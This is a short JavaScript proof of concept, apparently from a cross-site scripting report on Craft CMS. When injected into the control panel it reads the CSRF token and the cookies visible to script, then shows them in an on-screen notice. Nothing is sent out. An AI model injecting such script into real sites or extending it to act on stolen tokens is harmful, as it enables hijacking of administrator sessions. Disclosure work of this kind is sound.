const token = document.querySelector("input[name='CRAFT_CSRF_TOKEN']")?.value || "";

Craft.cp.displayNotice(
    "XSS PoC:<br>" +
    "CSRF token length: " + token.length + "<br>" +
    "Cookies visible to JS: \"" + document.cookie + "\" (should be empty)" + "<br>" +
    "HttpOnly cookies are present and used for authentication."
);
